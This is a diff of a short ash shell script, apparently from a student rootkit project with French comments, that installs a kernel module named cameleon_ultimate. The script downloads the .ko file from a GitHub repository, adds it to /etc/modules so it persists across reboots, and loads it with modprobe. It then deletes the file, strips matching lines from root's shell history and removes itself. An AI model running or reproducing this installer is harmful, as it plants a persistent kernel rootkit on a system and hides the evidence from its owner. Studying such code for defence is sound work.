@@ -1,11 +1,20 @@
 #!/bin/ash
 # echo "0 0 0 0" > /proc/sys/kernel/printk DONT WORK AND USELESS
+
+# récuperer le .ko
 wget https://github.com/gobelinor/Rootkit-Project/raw/refs/heads/dev_tibo/mesmodules/cameleon_ultimate.ko
+
+# persistence (load le module au demarage)
 echo "cameleon_ultimate" >> /etc/modules
 mkdir -p /lib/modules/$(uname -r)/extra
 cp cameleon_ultimate.ko /lib/modules/$(uname -r)/extra/
 depmod -a
+
+# load le module
 modprobe cameleon_ultimate
+
+# supprimer les traces
 rm cameleon_ultimate.ko
 sed -i '/cameleon_ultimate/d' /root/.ash_history
 sed -i '/insertion/d' /root/.ash_history
+rm insertion_script
